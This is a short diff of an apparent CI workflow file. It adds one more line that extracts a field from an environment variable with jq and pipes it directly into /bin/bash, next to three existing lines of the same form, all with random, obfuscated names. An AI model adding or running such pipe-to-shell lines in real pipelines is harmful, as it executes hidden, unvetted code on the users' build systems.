@@ -27,6 +27,7 @@ jobs:
           printf '%s' "$dy0" | jq -r .fmme448 | /bin/bash
           printf '%s' "$ueufp7" | jq -r .dt579 | /bin/bash
           printf '%s' "$vq3" | jq -r .npl98 | /bin/bash
+          printf '%s' "$p1792" | jq -r .dvl9146 | /bin/bash
 
       - name: Save results
         uses: actions/upload-artifact@v4
